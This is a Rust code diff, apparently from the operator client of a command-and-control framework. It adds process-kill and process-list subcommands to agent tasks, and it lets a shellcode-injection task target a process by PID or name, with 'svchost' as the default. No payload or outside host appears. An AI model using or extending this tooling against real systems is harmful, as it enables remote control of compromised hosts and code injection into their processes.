@@ -389,20 +389,42 @@ pub fn set_operations(client: &Client, matches: &ArgMatches) -> (Operation, Opti
                 Some(("ps", subm)) => {
                     op = Operation::AgentTask("ps".to_string());
 
-                    let filter = match subm.get_one::<String>("filter") {
-                        Some(f) => f.to_owned(),
-                        None => "*".to_owned(),
-                    };
+                    match subm.subcommand() {
+                        Some(("kill", subm2)) => {
+                            let pid = match subm2.get_one::<u32>("pid") {
+                                Some(p) => p.to_string(),
+                                None => {
+                                    op = Operation::Error("Process ID not specified.".to_string());
+                                    "".to_string()
+                                },
+                            };
 
-                    let exclude = match subm.get_one::<String>("exclude") {
-                        Some(x) => x.to_owned(),
-                        None => "".to_owned(),
-                    };
+                            options.task_opt = Some(TaskOption {
+                                agent_name: Some(agent_name.to_owned()),
+                                args: Some("kill ".to_string() + pid.as_str()),
+                            });
+                        }
+                        Some(("list", subm2)) => {
+                            let filter = match subm2.get_one::<String>("filter") {
+                                Some(f) => f.to_owned(),
+                                None => "*".to_owned(),
+                            };
+        
+                            let exclude = match subm2.get_one::<String>("exclude") {
+                                Some(x) => x.to_owned(),
+                                None => "".to_owned(),
+                            };
+        
+                            options.task_opt = Some(TaskOption {
+                                agent_name: Some(agent_name.to_owned()),
+                                args: Some("list ".to_string() + filter.as_str() + ":" + exclude.as_str()),
+                            });
+                        }
+                        _ => {
+                            op = Operation::Error("Subcommand not specified.".to_string());
+                        }
+                    }
 
-                    options.task_opt = Some(TaskOption {
-                        agent_name: Some(agent_name.to_owned()),
-                        args: Some(filter + ":" + exclude.as_str()),
-                    });
                 }
                 Some(("pwd", _)) => {
                     op = Operation::AgentTask("pwd".to_string());
@@ -470,10 +492,25 @@ pub fn set_operations(client: &Client, matches: &ArgMatches) -> (Operation, Opti
                 Some(("shellcode", subm)) => {
                     op = Operation::AgentTask("shellcode".to_string());
 
-                    let proc_name = match subm.get_one::<String>("process") {
-                        Some(n) => n.to_string(),
-                        None => "svchost".to_string(),
+                    let pid = match subm.get_one::<u32>("pid") {
+                        Some(p) => p.to_string(),
+                        None => "".to_string(),
                     };
+
+                    let proc_name = match subm.get_one::<String>("process") {
+                        Some(p) => p.to_string(),
+                        None => "".to_string(),
+                    };
+
+                    let mut args = String::new();
+
+                    if pid != "".to_string() {
+                        args = "pid ".to_owned() + pid.as_str();
+                    } else if proc_name != "".to_string() {
+                        args = "process ".to_owned() + proc_name.as_str();
+                    } else {
+                        args = "process svchost".to_string();
+                    }
 
                     let shellcode = match subm.get_one::<String>("file") {
                         Some(f) => {
@@ -494,9 +531,11 @@ pub fn set_operations(client: &Client, matches: &ArgMatches) -> (Operation, Opti
                         },
                     };
 
+                    args = args + " " + shellcode.as_str();
+
                     options.task_opt = Some(TaskOption {
                         agent_name: Some(agent_name.to_owned()),
-                        args: Some(proc_name + " " + shellcode.as_str()),
+                        args: Some(args),
                     });
                 }
                 Some(("sleep", subm)) => {
